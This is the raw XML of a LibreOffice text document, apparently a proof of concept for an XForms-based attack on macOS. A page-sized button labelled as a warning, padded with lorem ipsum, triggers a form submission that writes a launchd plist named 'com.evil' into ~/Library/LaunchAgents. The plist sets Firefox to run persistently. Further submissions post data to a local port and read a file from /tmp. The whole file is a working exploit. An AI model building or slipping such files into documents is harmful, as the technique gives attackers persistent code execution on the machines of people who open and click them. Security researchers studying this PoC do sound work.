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316000002C8CD9B07FCB4B3CD71.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Mono" svg:font-family="'DejaVu Sans Mono'" style:font-adornments="Normal" style:font-family-generic="modern"/>
    <style:font-face style:name="FreeSans1" svg:font-family="FreeSans" style:font-family-generic="swiss"/>
    <style:font-face style:name="Liberation Sans" svg:font-family="'Liberation Sans'" style:font-adornments="Standard"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center"/>
      <style:text-properties style:font-name="Liberation Sans" fo:font-size="18pt"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph">
      <style:paragraph-properties fo:text-align="center"/>
      <style:text-properties style:font-name="Liberation Sans" fo:font-size="18pt" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph">
      <style:paragraph-properties fo:text-align="start"/>
      <style:text-properties fo:color="#ffffff" style:text-line-through-style="none" style:text-line-through-type="none" style:font-name="DejaVu Sans Mono" fo:font-size="14pt" fo:font-style="normal" style:text-underline-style="none" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph">
      <style:paragraph-properties fo:text-align="start"/>
      <style:text-properties style:font-name="Liberation Sans" fo:font-size="18pt" fo:font-style="normal" fo:font-weight="normal"/>
    </style:style>
    <style:style style:name="gr1" style:family="graphic">
      <style:graphic-properties fo:background-color="#b4c7dc"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ackground-color="#b4c7dc" style:vertical-pos="from-top" style:vertical-rel="paragraph" style:horizontal-pos="from-left" style:horizontal-rel="paragraph" draw:wrap-influence-on-position="once-concurrent" style:flow-with-text="false"/>
    </style:style>
    <style:style style:name="gr3" style:family="graphic">
      <style:graphic-properties fo:background-color="#ffffff" fo:border="solid #ffffff"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background-color="#ffffff"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xforms:model id="XForm">
          <xforms:instance id="Instance 1">
            <instanceData>
              <Data>
                <Macro>
                  <plist version="1.0">
                    <dict>
                      <key>Label</key>
                      <string>com.evil</string>
                      <key>ProgramArguments</key>
                      <array>
                        <string>firefox</string>
                        <string>additional arguments</string>
                      </array>
                      <key>KeepAlive</key>
                      <true/>
                    </dict>
                  </plist>
                </Macro>
              </Data>
            </instanceData>
          </xforms:instance>
          <xforms:bind id="Binding1" nodeset="Data/Macro/*"/>
          <xforms:submission id="SubmitData" bind="Binding1" ref="/" action="http://localhost:8082" method="post" indent="false" omit-xml-declaration="false" standalone="false" replace="none"/>
          <xforms:submission id="SaveData" bind="Binding1" ref="/" action="file:///~/Library/LaunchAgents/com.evil.plist" method="put" indent="false" omit-xml-declaration="false" standalone="false" replace="none"/>
          <xforms:submission id="ReadData" bind="Binding1" ref="/" action="file:///tmp/data.xml" method="get" indent="false" omit-xml-declaration="false" standalone="false" replace="instance"/>
          <xsd:schema/>
        </xforms:model>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Data" form:control-implementation="ooo:com.sun.star.form.component.TextField" xml:id="control1" form:id="control1" form:tab-index="28" form:input-required="false" form:convert-empty-to-null="true" xforms:bind="Binding1">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button form:name="SaveButton" form:control-implementation="ooo:com.sun.star.form.component.CommandButton" xml:id="control2" form:id="control2" form:label=" IF YOU CLICK INTO THIS DOCUMENT YOU WILL ADD A LAUNCHER,&#10;&#10; AND THEREBY ALLOW ARBITRARY COMMANDS TO BE EXECUTED.&#10;&#10;&#10;&#10;&#10;&#10;&#10;&#10;Lorem ipsum dolor sit amet, his te nonumy virtute mediocritatem, has inani invenire ea. Sea id corrumpit conceptam percipitur, torquatos suscipiantur et mei, ne mei amet tation salutandi. Vim ei paulo noster veritus. Quis augue animal te usu.&#10;&#10;Vim summo discere dissentiunt eu, eu sonet laudem qui. Clita vocibus voluptua mea ea. Delectus molestiae dissentiunt vel an, ad cibo lobortis mel, putent aliquip scribentur ius an. Eu qui atqui exerci, mollis interesset disputationi his te, etiam omnes ex qui.&#10;&#10;At interesset intellegebat per, duis justo appetere pri et. Wisi malis quando ius an, esse philosophia eu vix, an est invidunt postulant corrumpit. Per vivendum consequuntur ei, sed nulla feugiat at, prima commune no sit. Nec graecis euripidis et, omnes vivendo an quo, admodum salutandi mea ex.&#10;&#10;Posse placerat urbanitas mei ea. Lorem etiam dissentias mei ea. Sed suscipit euripidis comprehensam ne, vidit debitis vim ne, mei amet harum ut. Saperet volumus intellegam te qui, recusabo democritum conclusionemque et eos. In tractatos constituto eos, perpetua intellegam duo no.&#10;&#10;Ea vel ridens inciderint, eu aperiri fastidii adversarium eum, et eum docendi vivendum adipiscing. Alii volutpat vim ei. Quidam invidunt usu te, id eos possit deleniti periculis. Possim legimus at vix. Malis doming eum te.&#10;&#10;Sed ea tibique interpretaris, mea ex oratio essent. Ea ignota deserunt atomorum eos. Suas sanctus nominati eos et, malorum minimum voluptaria eum in. Ex mazim mucius epicurei sea.&#10;&#10;Usu tibique singulis et, ancillae moderatius instructior ea vis, pro saepe nullam altera ut. Per cu nibh iracundia, sea ut quodsi iisque iudicabit. Ne sale ullum vix, pro eu dolore iudicabit. Ne doming diceret cum, verear adipisci signiferumque sit te. Delenit definitiones no sit, ut nobis munere mel.&#10;&#10;Summo impedit vel et, noluisse luptatum insolens cu his. Vero facilisi sed no, vim an suavitate maluisset. Cu quot electram his, ad sed vidisse urbanitas. No everti expetenda vituperata est, eos nobis alterum no, purto dicta deseruisse et vel. Quot mazim at vel. Cum at assum dolorum perfecto, pri tation quaeque lucilius ea.&#10;&#10;Cum putent tibique gubergren ut, ut causae suavitate sed. Eu legere aliquip ius. Ex libris mucius intellegam cum, legendos corrumpit incorrupte mea ne. Eam eu vero falli debet, ex habeo viderer tacimates mel, everti commodo euripidis ad quo. Nam movet propriae ut, sea autem clita malorum an. Cu vel paulo commune ocurreret, verear accusata eam no, fuisset posidonium elaboraret in vel.&#10;&#10;Eam paulo propriae senserit et, facete periculis ad quo, illum volutpat repudiandae ex vix. Natum vocent saperet has ut. Usu vidisse laboramus vituperatoribus ei, qui inani principes quaerendum ad. Brute referrentur quo no, ei mei dolor instructior. Has ad legere feugait signiferumque.&#10;&#10;Eam graece ullamcorper at, eos atqui explicari gloriatur cu, malorum salutandi et eam. Ius et cetero percipit, vix quaeque dolores te. Id impedit singulis dissentiet usu, ne nec agam oratio dignissim. Et sea nonumy evertitur deseruisse. Natum zril definiebas et sea, commodo deseruisse id has.&#10;&#10;Aliquid habemus recusabo et mel, cu viris graecis per, rebum semper diceret et per. Falli eripuit nominavi at per. No purto choro cotidieque sed, nostrud adversarium at eum. Modo atqui habemus at vix, his soluta periculis ex, mucius accusamus has ne. Ex brute nominavi argumentum duo, errem quando fierent no eum.&#10;&#10;Ex pri tation consequat, ne pertinax consequuntur sit. Eos ne delenit appetere abhorreant. Sed te scaevola voluptaria, in usu choro populo pertinax, tincidunt consectetuer et his. Sale urbanitas eu nec. Ut nam regione abhorreant. Quo eu rebum menandri nominati, nam error meliore ad. Quo cu etiam nominavi, eu novum rationibus vis.&#10;&#10;Eu mel lorem nonumes, an amet labore nam. Nam melius facilisi eu, aperiam placerat ne vis. Legere delicatissimi ex vix, sit elitr repudiare liberavisse ex. Errem eirmod integre pri id. Ad eruditi praesent sed, sea et eros alienum laboramus, te nec causae percipit persequeris.&#10;&#10;Postea adipiscing necessitatibus ex nec, quis eros te pri. Cu usu ignota labitur euismod, everti albucius invidunt pro cu. Eam admodum omittam delicatissimi et, et scripta ullamcorper pri. An dicit tractatos quaerendum pro, ei enim aperiri abhorreant ius, sit virtute fabulas feugait ad. Mel solet adolescens ex, pri illud euismod maiorum ad, diceret alienum interpretaris est ea. In ius delectus referrentur, his deleniti oportere liberavisse ut, vim at noluisse menandri." form:tab-index="32" form:button-type="submit" office:target-frame="" form:image-data="Pictures/1000020100000316000002C8CD9B07FCB4B3CD71.png" form:xforms-submission="SaveData" form:focus-on-click="false" form:delay-for-repeat="PT0.500000000S" form:image-position="center">
            <form:properties>
              <form:property form:property-name="DefaultControl" office:value-type="string" office:string-value="com.sun.star.form.control.CommandButton"/>
            </form:properties>
          </form:button>
          <form:button form:name="SubmitButton" form:control-implementation="ooo:com.sun.star.form.component.CommandButton" xml:id="control3" form:id="control3" form:label="Submit" form:button-type="submit" office:target-frame="" form:xforms-submission="SubmitData" form:focus-on-click="false" form:delay-for-repeat="PT0.500000000S" form:image-position="center">
            <form:properties>
              <form:property form:property-name="DefaultControl" office:value-type="string" office:string-value="com.sun.star.form.control.CommandButton"/>
            </form:properties>
          </form:button>
          <form:button form:name="ReadButton" form:control-implementation="ooo:com.sun.star.form.component.CommandButton" xml:id="control4" form:id="control4" form:label="Read from File" form:button-type="submit" office:target-frame="" form:xforms-submission="ReadData" form:focus-on-click="false"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style-name="gr4" draw:text-style-name="P4" svg:width="21cm" svg:height="29.692cm" svg:x="-0.917cm" svg:y="0cm" draw:control="control2"/>
      <text:p text:style-name="Standard"><draw:control text:anchor-type="as-char" svg:y="22.361cm" draw:z-index="1" draw:style-name="gr3" draw:text-style-name="P3" svg:width="0.47cm" svg:height="0.768cm" draw:control="control1"/></text:p>
      <text:p text:style-name="Standard"/>
      <text:p text:style-name="Standard"><draw:control text:anchor-type="paragraph" draw:z-index="2" draw:style-name="gr2" draw:text-style-name="P2" svg:width="5.001cm" svg:height="1.269cm" svg:x="0.055cm" svg:y="0.34cm" draw:control="control3"/><draw:control text:anchor-type="paragraph" draw:z-index="3" draw:name="Form1" draw:style-name="gr1" draw:text-style-name="P1" svg:width="5.001cm" svg:height="1.271cm" svg:x="11.852cm" svg:y="0.34cm" draw:control="control4"/></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Mono" svg:font-family="'DejaVu Sans Mono'" style:font-adornments="Normal" style:font-family-generic="modern"/>
    <style:font-face style:name="FreeSans1" svg:font-family="FreeSans" style:font-family-generic="swiss"/>
    <style:font-face style:name="Liberation Sans" svg:font-family="'Liberation Sans'" style:font-adornments="Standard"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8-11T20:19:17.813535514</meta:creation-date>
    <meta:editing-duration>PT1M16S</meta:editing-duration>
    <meta:editing-cycles>2</meta:editing-cycles>
    <meta:generator>LibreOffice/6.3.3.2.0$Linux_X86_64 LibreOffice_project/30$Build-2</meta:generator>
    <dc:date>2020-08-11T20:20:34.101504845</dc:date>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="1" meta:paragraph-count="1" meta:word-count="0" meta:character-count="0" meta:non-whitespace-character-count="0"/>
  </office:meta>
</office:document-meta>
</file>